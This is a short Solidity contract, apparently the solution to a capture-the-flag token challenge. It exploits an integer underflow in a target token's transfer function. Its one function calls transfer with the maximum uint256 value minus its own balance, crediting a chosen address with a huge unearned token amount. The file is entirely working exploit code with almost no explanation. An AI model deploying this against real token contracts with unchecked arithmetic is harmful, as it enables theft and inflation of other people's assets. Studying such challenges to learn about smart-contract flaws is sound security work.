```solidity
// SPDX-License-Identifier: MIT

pragma solidity >0.8.0;

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns (uint256 balance);
}

contract TokenSolution {
    IToken token;

    constructor(address _token) {
        token = IToken(_token);
    }

    // Prior to calling this function we need to transfer tokens to this contract address.
    function overflowBalance(address _to) external  {
        uint256 balance = token.balanceOf(address(this));
        uint256 value = type(uint256).max - balance;
        token.transfer(_to, value);
    }
}
```
